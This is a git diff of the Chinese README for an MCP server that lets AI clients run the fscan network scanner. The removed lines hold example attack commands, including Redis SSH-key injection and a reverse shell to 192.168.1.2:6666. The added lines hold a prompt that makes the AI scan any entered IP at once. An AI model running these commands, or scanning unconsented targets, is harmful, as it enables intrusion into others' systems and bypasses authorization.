@@ -1,86 +1,60 @@
-# Fscan MCP Server 模板
-## 项目简介
-Fscan MCP Server 是一个基于 **Model Context Protocol (MCP)** 的轻量级服务，旨在通过自然语言指令快速调用 **Fscan** 内网安全扫描工具。用户只需输入简单的中文提示（如 “帮我扫下 127.0.0.1 端口”），即可自动触发预设的 Fscan 命令，实现扫描任务的自动化执行。
+# fscan MCP 项目指南
 
-### 核心功能
-**自然语言触发**：支持通过中文指令直接调用 Fscan 扫描（如 “扫描 192.168.1.1/24 网段”）。
-**内置命令模板**：预定义常见扫描场景（端口扫描、漏洞检测、服务爆破等），可快速扩展新指令。
-**MCP 协议集成**：通过标准化协议与 MCP 客户端（如 Cursor、Claude Desktop）无缝对接，支持动态发现和安全权限控制。
-
-## 安装指南
-### 环境要求
-Python 3.8+
-MCP 客户端（如 [Cursor](https://www.cursor.so/) 或 [万径千机](https://github.com/xxx/wanjingqianji)）
-
-### 步骤 1：安装依赖
-需要在mcp_Server同目录下放置fscan.exe
-```
-pip install mcp==1.0.0
-```
-
-### 步骤 2：配置 MCP 客户端
-
-以 **Cursor IDE** 为例：
-
-创建配置文件 `mcp.config.json`：
-```json
-{
-    "mcpServers": {
-        "fscan-mcp-server": {
-            "name": "Fscan 内网安全扫描工具",
-            "command": "uv",
-            "args": [
-                "--directory",
-                "${WORKSPACE}/fscan_MCP",
-                "run",
-                "--with",
-                "mcp",
-                "mcp",
-                "run",
-                "fscan_mcp_server.py"
-            ],
-            "disabled": false,
-            "autoApprove": []
-        }
-    }
-}
-```
-将配置文件导入 MCP 客户端（路径需根据实际项目调整）。
-
-## 使用示例
-
-### 触发指令
-
-```
-用户输入：帮我扫下127.0.0.1端口
-
-模型调用：fscan.exe -h 127.0.0.1 -p 1-65535 -nopoc
-```
-## Fscan 功能支持
-
-| 功能模块      | 指令示例                   | 对应 Fscan 命令                                     |
-| --------- | ---------------------- | ----------------------------------------------- |
-| 端口扫描      | 扫描 192.168.1.1 的 80 端口 | `fscan.exe -h 192.168.1.1 -p 80`                |
-| 漏洞检测      | 检测 MS17-010 漏洞         | `fscan.exe -h 192.168.1.1 -m ms17010`           |
-| Redis 写公钥 | 向 Redis 服务器写入 SSH 公钥   | `fscan.exe -h 192.168.1.1 -rf id_rsa.pub`       |
-| 反弹 Shell  | 计划任务反弹 Shell           | `fscan.exe -h 192.168.1.1 -rs 192.168.1.2:6666` |
+## 项目概述
+fscan MCP 是一个基于 fscan 工具的端口扫描和漏洞检测的 MCP 服务封装。项目通过 FastMCP 框架提供标准化的接口，便于集成到其他系统中。
 
 ## 项目结构
 ```
-├── fscan_mcp_server.py  # MCP 服务入口
-├── commands.json       # 指令模板配置
-└── README.md           # 文档
+├── brute-passwd/       # 爆破字典目录
+├── .trae/              # 项目规则配置
+├── config.py           # 配置文件
+├── fscan.exe           # fscan 可执行文件
+├── fscan_mcp_server.py # 主服务文件
+├── logger.py           # 日志模块
+├── pyproject.toml      # 项目配置文件
+└── README.md           # 项目说明文档
 ```
 
-## 贡献指南
-**添加新指令**：在 `commands.json` 中定义触发词和对应命令。
-**优化逻辑**：修改 `fscan_mcp_server.py` 中的参数解析或响应处理。
-**文档完善**：补充使用案例或配置说明。
-## 许可证
-本项目采用 **MIT 许可证**，详情见 [LICENSE](LICENSE)。
+## 使用流程
+1. **初始化环境**
+   - 确保系统已安装 Python 3.12+ 环境
+   - 安装项目依赖：`pip install -r requirements.txt`
 
-## 参考资料
-[Fscan 官方文档](https://github.com/shadow1ng/fscan)
-[MCP 协议规范](https://github.com/anthropic/mcp)
-[MCP 客户端配置指南](https://www.cursor.so/docs/guides/mcp)
-通过本模板，您可以快速构建自定义的 AI 驱动安全扫描工具链，实现从自然语言指令到复杂渗透测试任务的自动化执行。
+2. **启动服务**
+   - 运行主服务：`uv --directory /path/to/fscan_mcp --with mcp mcp run fscan_mcp_server.py`
+
+3. **调用服务**
+   - 通过 MCP 协议调用 fscan_mcp_server 工具
+   - 支持参数：
+     - `ip` (str): 目标 IP 地址，必填参数
+     - `port_range` (str): 端口范围，默认 1-65535
+     - `proxy` (str): 代理地址，可选
+     - `output_path` (str): 输出文件路径，可选
+     - `input_file` (str): 输入文件路径，可选
+     - `report` (bool): 是否生成报告，默认 False
+     - `vuln_scan` (bool): 是否进行漏洞扫描，默认 False
+
+4. **结果处理**
+   - 扫描结果通过 stdout 返回
+   - 报告文件保存在指定路径
+
+## 关键模块
+- **fscan_mcp_server.py**: 主服务模块，封装 fscan 工具的 MCP 接口
+- **config.py**: 配置文件，包含扫描参数和漏洞检测配置
+- **logger.py**: 日志模块，记录服务运行状态
+
+## 注意事项
+- 确保 fscan.exe 文件存在于项目根目录
+- 扫描前请确认目标系统是否允许进行端口扫描
+
+
+# 提示词:
+// 提示词部分:用户可设定在server内部也可设定在客户端，为了更好的体验建议设定在server内部,避免调用时出现问题,默认未添加
+## 语言设定
+	使用中文进行交互与输出。
+## 触发机制与操作流程（调用fscan_mcp）
+	当系统接收到用户输入的 IP 地址时，需立即调用 fscan_mcp 工具对该 IP 地址进行全面扫描。扫描任务完成后，按照以下逻辑进行后续操作：
+## 报告生成要求（调用工具阶段）
+ 所有生成的结果都存放在/fscan_result目录下
+	2.**可视化内容**：依据(逻辑处理)的结果进行生成,使用工具生成标准化、格式化的端口检测报告.html文件
+	3.将所有web资产进行收集保存为result_url.txt(基础写入至txt)
